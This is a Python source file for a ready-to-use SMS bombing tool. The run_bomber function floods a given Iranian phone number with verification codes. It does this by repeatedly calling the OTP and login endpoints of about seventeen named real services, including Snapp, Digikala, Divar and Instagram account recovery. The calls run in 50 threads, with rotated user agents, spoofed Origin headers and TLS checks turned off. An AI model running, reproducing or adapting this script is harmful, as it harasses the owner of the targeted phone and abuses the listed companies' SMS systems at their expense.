import requests
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

THREAD_COUNT = 50
TIMEOUT = 8
MAX_RETRIES = 1
REQUESTS_PER_API = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]

def get_all_apis(phone: str) -> list:
    phone_clean = phone[1:] if phone.startswith('0') else phone
    phone_code = f"+98{phone_clean}"
    
    apis = [
        {'name': 'Snapp', 'url': 'https://api.snapp.ir/api/v1/sms/link', 'method': 'POST', 'data': json.dumps({"phone": phone}), 'type': 'json', 'headers': {'Origin': 'https://snapp.ir'}},
        {'name': 'Divar', 'url': 'https://api.divar.ir/v5/auth/authenticate', 'method': 'POST', 'data': json.dumps({"phone": phone}), 'type': 'json', 'headers': {'Origin': 'https://divar.ir'}},
        {'name': 'Digikala', 'url': 'https://api.digikala.com/v1/user/authenticate/', 'method': 'POST', 'data': json.dumps({"username": phone, "otp_call": False}), 'type': 'json', 'headers': {'Origin': 'https://www.digikala.com'}},
        {'name': 'Alibaba', 'url': 'https://ws.alibaba.ir/api/v3/account/mobile/otp', 'method': 'POST', 'data': json.dumps({"phoneNumber": phone_clean}), 'type': 'json', 'headers': {'Origin': 'https://www.alibaba.ir'}},
        {'name': 'Tapsi', 'url': 'https://api.tapsi.ir/api/v2.2/user', 'method': 'POST', 'data': json.dumps({"credential": {"phoneNumber": phone, "role": "PASSENGER"}, "otpOption": "SMS"}), 'type': 'json', 'headers': {'Origin': 'https://app.tapsi.ir'}},
        {'name': 'Sheypoor', 'url': 'https://www.sheypoor.com/api/v10.0.0/auth/send', 'method': 'POST', 'data': json.dumps({"username": phone}), 'type': 'json', 'headers': {'Origin': 'https://www.sheypoor.com'}},
        {'name': 'Torob', 'url': 'https://api.torob.com/v4/user/phone/send-pin/', 'method': 'GET', 'data': {'phone_number': phone, 'source': 'next_desktop'}, 'type': 'form', 'headers': {'Origin': 'https://torob.com'}},
        {'name': 'Bama', 'url': 'https://bama.ir/signin-checkforcellnumber', 'method': 'POST', 'data': f'cellNumber={phone}', 'type': 'form', 'headers': {'Origin': 'https://bama.ir'}},
        {'name': 'Snappfood', 'url': 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass', 'method': 'POST', 'data': f'cellphone={phone}', 'type': 'form', 'headers': {'Origin': 'https://snappfood.ir'}},
        {'name': 'Jabama', 'url': 'https://gw.jabama.com/api/v4/account/send-code', 'method': 'POST', 'data': json.dumps({"mobile": phone}), 'type': 'json', 'headers': {'Origin': 'https://jabama.com'}},
        {'name': 'Balad', 'url': 'https://account.api.balad.ir/api/web/auth/login/', 'method': 'POST', 'data': json.dumps({"phone_number": phone, "os_type": "W"}), 'type': 'json', 'headers': {'Origin': 'https://balad.ir'}},
        {'name': 'Lendo', 'url': 'https://api.lendo.ir/api/customer/auth/send-otp', 'method': 'POST', 'data': json.dumps({"mobile": phone}), 'type': 'json', 'headers': {'Origin': 'https://lendo.ir'}},
        {'name': 'Okala', 'url': 'https://api-react.okala.com/C/CustomerAccount/OTPRegister', 'method': 'POST', 'data': json.dumps({"mobile": phone, "deviceTypeCode": 0, "confirmTerms": True}), 'type': 'json', 'headers': {'Origin': 'https://www.okala.com'}},
        {'name': 'MCI Shop', 'url': 'https://api-ebcom.mci.ir/services/auth/v1.0/otp', 'method': 'POST', 'data': json.dumps({"msisdn": phone_clean}), 'type': 'json', 'headers': {'Origin': 'https://shop.mci.ir'}},
        {'name': 'GapFilm', 'url': 'https://core.gapfilm.ir/api/v3.1/Account/Login', 'method': 'POST', 'data': json.dumps({"Type": "3", "Username": phone_clean}), 'type': 'json', 'headers': {'Origin': 'https://www.gapfilm.ir'}},
        {'name': 'Rubika', 'url': 'https://messengerg2c4.iranlms.ir/', 'method': 'POST', 'data': json.dumps({"api_version": "3", "method": "sendCode", "data": {"phone_number": phone_clean, "send_type": "SMS"}}), 'type': 'json', 'headers': {'Origin': 'https://web.rubika.ir'}},
        {'name': 'Instagram', 'url': 'https://www.instagram.com/accounts/account_recovery_send_ajax/', 'method': 'POST', 'data': f'email_or_username={phone_code}', 'type': 'form', 'headers': {'Origin': 'https://www.instagram.com'}},
    ]
    
    return apis

def send_request(api: dict, stats: dict) -> bool:
    for _ in range(MAX_RETRIES):
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Connection': 'keep-alive',
            }
            
            if 'headers' in api:
                headers.update(api['headers'])
            
            if api['type'] == 'json':
                headers['Content-Type'] = 'application/json'
                data = api['data'] if isinstance(api['data'], dict) else json.loads(api['data'])
            else:
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                data = api['data']
            
            if api['method'] == 'POST':
                if api['type'] == 'json':
                    r = requests.post(api['url'], json=data, headers=headers, timeout=TIMEOUT, verify=False)
                else:
                    r = requests.post(api['url'], data=data, headers=headers, timeout=TIMEOUT, verify=False)
            else:
                r = requests.get(api['url'], params=data if isinstance(data, dict) else {}, headers=headers, timeout=TIMEOUT, verify=False)
            
            if r.status_code in [200, 201, 202, 204]:
                stats['success'] += 1
                return True
            else:
                stats['failed'] += 1
                return False
        except:
            stats['failed'] += 1
            return False
    
    stats['failed'] += 1
    return False

def run_bomber(phone: str, limit: int = 5) -> dict:
    stats = {'success': 0, 'failed': 0, 'total': 0}
    apis = get_all_apis(phone)
    stats['total'] = len(apis) * limit
    
    all_requests = []
    for api in apis:
        for _ in range(limit):
            all_requests.append(api)
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(send_request, api, stats) for api in all_requests]
        for _ in as_completed(futures):
            pass
    
    return stats